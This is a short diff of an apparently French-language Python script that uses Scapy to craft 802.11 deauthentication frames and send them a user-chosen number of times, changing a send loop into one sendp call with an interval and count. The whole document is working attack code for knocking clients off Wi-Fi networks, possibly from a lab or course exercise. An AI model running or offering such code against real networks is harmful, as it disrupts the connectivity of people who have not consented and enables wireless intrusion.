@@ -41,5 +41,4 @@ while(True):
     dot11 = Dot11(addr1=dst, addr2=src, addr3=bssid)
     packet = RadioTap()/dot11/Dot11Deauth(reason=codeReason)
     # On envoit le paquet n fois (demandé à l'utilisateur)
-    for n in range(int(deauthNumber)):
-        sendp(packet, iface=interface)
+    sendp(packet, iface=interface, inter=0.5,count=int(deauthNumber))
